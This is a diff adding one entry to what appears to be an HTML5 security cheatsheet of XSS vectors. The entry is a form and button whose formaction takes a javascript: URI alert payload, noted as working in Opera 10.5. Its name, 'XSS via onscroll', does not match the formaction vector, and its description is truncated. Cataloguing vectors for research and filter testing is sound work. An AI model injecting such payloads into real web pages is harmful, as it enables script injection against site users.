@@ -1,0 +1,19 @@
+{
+    'items': [
+        {
+            'id'         : 1, 
+            'category'   : 'html5', 
+            'name'       : 'XSS via onscroll',
+            'data'       : '<form id="test" /><button form="test" formaction="%pos_1%">X',
+            'description': 'A small vector displaying the HTML5 form and formac ... the supported browsers.',
+            'browsers'   : {
+                'opera': ['10.5']
+            },
+            'payload'    : {
+                'pos_1': 'js_uri_alert'
+            },
+            'tags'       : ['xss', 'html5', 'ff', 'gc'],
+            'reporter'   : '.mario'
+        }
+    ]        
+}
